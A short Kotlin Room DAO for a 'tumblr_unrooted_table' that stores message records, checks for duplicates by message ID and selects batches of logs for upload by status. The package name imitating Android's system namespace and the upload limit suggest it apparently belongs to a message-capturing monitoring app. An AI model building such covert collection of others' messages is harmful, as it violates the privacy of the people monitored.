package com.android.services.db.dao

import androidx.room.Dao
import androidx.room.Insert
import androidx.room.OnConflictStrategy
import androidx.room.Query
import com.android.services.db.entities.TumblrUnrooted
import com.android.services.util.AppConstants

@Dao
interface TumblrUnrootedDao {

    @Insert(onConflict = OnConflictStrategy.IGNORE)
    fun insert(imoUnrooted: TumblrUnrooted)

    @Query("Select uniqueId from tumblr_unrooted_table where uniqueId = :messageId")
    fun checkTumblrExistsAlready(messageId: String): String?

    @Query("Select * from tumblr_unrooted_table where status = :status order by id ASC limit ${AppConstants.imLogsUploadLimit}")
    fun selectAllTumblrUnrootedLogs(status: Int): List<TumblrUnrooted>

    @Query("Update tumblr_unrooted_table set status = :updated_status where id BETWEEN :startId AND :endId")
    fun update(startId: Int, endId: Int, updated_status: Int): Int
}